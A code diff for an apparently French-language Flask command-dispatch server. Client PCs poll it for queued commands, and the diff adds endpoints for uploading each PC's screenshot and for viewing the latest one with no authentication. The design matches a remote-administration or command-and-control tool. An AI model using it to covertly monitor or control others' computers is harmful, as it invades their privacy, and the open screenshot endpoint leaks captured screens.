@@ -1,8 +1,14 @@
-from flask import Flask, request, jsonify, render_template, Response
+from flask import Flask, request, jsonify, render_template, Response, send_file
 import json
 import queue
 import threading
 import time
+from io import BytesIO
+from PIL import Image
+import base64
+
+last_screenshots = {}
+
 
 app = Flask(__name__)
 
@@ -20,43 +26,43 @@ alive_pcs = []
 
 # SERVEUR
 
-def update_pc_dead(timeout):
-    global alive_pcs
-    print("UDPATE EN COURS")
-    copy_alive_pcs = alive_pcs.copy()
-    for i, alive_pc in enumerate(copy_alive_pcs):
-        now = time.time()
-        time_alive_pc = alive_pc["time"]
-        time_end = now - time_alive_pc
-        if time_end > timeout:
-            a = alive_pc["pc_id"]
-            print(f"SUPPRESSION DE {a}")
-            alive_pcs.pop(i)
-    print(f"[DEAD] LISTE DES PC EN VIE : {alive_pcs}")
+# def update_pc_dead(timeout):
+#     global alive_pcs
+#     now = time.time()
+    
+#     # Filtrer la liste en une seule passe
+#     alive_pcs = [
+#         pc for pc in alive_pcs 
+#         if now - pc["time"] <= timeout
+#     ]
+    
+#     print(f"[DEAD CHECK] PCs en vie : {[pc['pc_id'] for pc in alive_pcs]}")
 
 
-def worker():
-    while True:
-        update_pc_dead(30)
-        time.sleep(5)
+# def worker():
+#     while True:
+#         update_pc_dead(30)
+#         time.sleep(5)
 
-t = threading.Thread(target=worker, daemon=True)
-t.start()
+# t = threading.Thread(target=worker, daemon=True)
+# t.start()
 
 
 def add_command(command_info, pc_id):
     id = str(uuid.uuid4())
     print(id)
-    commands[id] = {"command_info": command_info, "pc_id": pc_id}
+    commands[id] = {"command_info": command_info, "pc_id": pc_id, "timestamp": time.time()}
     print(commands)
     print(f"Command Ajouté dans la liste, liste complète : {commands}")
 
 def get_commands(pc_id):
     command_filre = []
+    commands_copy = commands.copy()
 
-    for id, command in commands.items():
-        if command["pc_id"] == pc_id:
-            print()
+    for id, command in commands_copy.items():
+        if time.time() - command["timestamp"] > 60:
+            del_command(id)
+        elif command["pc_id"] == pc_id:
             command_filre.append({"command_id": id, "command_info" : command["command_info"]})
 
     return command_filre
@@ -75,6 +81,33 @@ def send_sse_update(event_type, data):
 def del_command(command_id):
     del commands[command_id]
     print("Command supprimé !")
+
+@app.route("/api/upload_screen", methods=["POST"])
+def upload_screen():
+    pc_id = request.form.get("pc_id")
+    file = request.files.get("image")
+    if not pc_id or not file:
+        return jsonify({"status": "error", "message": "pc_id ou image manquant"}), 400
+
+    print(file)
+    print(pc_id)
+
+    # on garde uniquement la dernière image en RAM
+    last_screenshots[pc_id] = file.read()
+    print(f"last_screenshots[:500] : {str(last_screenshots)[:500]}")
+
+    return jsonify({"status": "success"}), 200
+
+@app.route("/api/screen/<pc_id>")
+def get_screen(pc_id):
+    img_bytes = last_screenshots.get(pc_id)
+    if not img_bytes:
+        return "Pas d'image disponible", 404
+    return send_file(
+        BytesIO(img_bytes),
+        mimetype="image/jpeg",
+        as_attachment=False
+    )
 
 # ===== ROUTES POUR RECUPERER LES COMMANDES =====
 @app.route("/api/commands", methods=["GET"])
